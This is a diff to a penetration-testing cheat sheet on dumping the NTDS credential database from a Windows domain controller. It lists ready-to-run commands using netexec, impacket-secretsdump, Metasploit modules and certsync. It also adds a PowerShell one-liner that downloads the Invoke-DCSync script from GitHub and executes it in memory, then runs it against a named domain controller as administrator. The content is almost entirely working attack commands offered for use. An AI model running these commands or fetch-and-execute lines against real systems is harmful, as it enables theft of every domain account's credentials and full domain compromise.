@@ -1,14 +1,27 @@
 # Dump NTDS from Domain Controller
 
-## Tools: CrackMpaExec/Netexec , secretsdump , ntdsutil , metasploit , certsync
+## Tools: CrackMapExec/Netexec , secretsdump , ntdsutil , metasploit , certsync
 
- - netexec smb DC_IP -u USER -p PASSWORD -d DOMAIN --ntds
+    netexec smb DC_IP -u USER -p PASSWORD -d DOMAIN --ntds
 
- - impacket-secretsdump 'DOMAIN/USER:PASSWORD'@IP
+    impacket-secretsdump 'DOMAIN/USER:PASSWORD'@IP
 
- - windows/gather/credentials/domain_hashdump (Metasploit)
+    windows/gather/credentials/domain_hashdump (Metasploit)
 
- - certsync -u USER -p PASSWORD -d DOMAIN -dc-ip DC_IP -ns NAMESERVER_IP
+    certsync -u USER -p PASSWORD -d DOMAIN -dc-ip DC_IP -ns NAMESERVER_IP
+
+    use auxiliary/admin/smb/psexec_ntdsgrab (Metasploit)
+
+### Invoke-DCSync
+
+##### Load into memory
+
+    IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-DCSync.ps1")
+
+##### Execute
+
+    Invoke-DCSync -dcfqdn DC01.security.local -username administrator
+
 
 ### NTDSUtil
 
